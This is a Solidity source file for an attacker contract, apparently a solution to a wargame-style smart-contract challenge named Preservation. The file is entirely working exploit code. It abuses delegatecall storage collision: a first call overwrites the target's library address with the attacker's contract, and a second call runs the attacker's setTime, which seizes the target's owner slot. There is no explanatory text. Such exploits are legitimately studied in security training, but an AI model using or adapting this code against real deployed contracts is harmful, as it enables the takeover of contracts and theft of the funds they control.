// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Preservation.sol";

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    address public victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        Preservation(victim).setFirstTime(uint256(address(this)));

        Preservation(victim).setFirstTime(7370616872);
    }

    function setTime(uint256 _owner) public {
        owner = tx.origin;
    }
}
